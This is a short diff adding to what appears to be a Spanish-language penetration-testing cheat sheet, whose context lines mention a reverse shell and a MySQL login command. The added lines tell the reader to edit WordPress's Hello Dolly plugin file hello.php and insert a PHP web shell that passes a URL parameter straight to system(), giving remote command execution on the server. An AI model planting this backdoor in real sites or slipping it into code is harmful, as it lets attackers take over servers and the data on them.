@@ -34,3 +34,9 @@ Reverse shell
 
 Conectarse por mysql
 	mysql -uUSUARIO -pPASSWORD -h HOST
+	
+Wordpress
+	Editar hello.php de Hello Dolly y agregar
+		if($_GET['cmd']) {
+		  system($_GET['cmd']);
+		  }
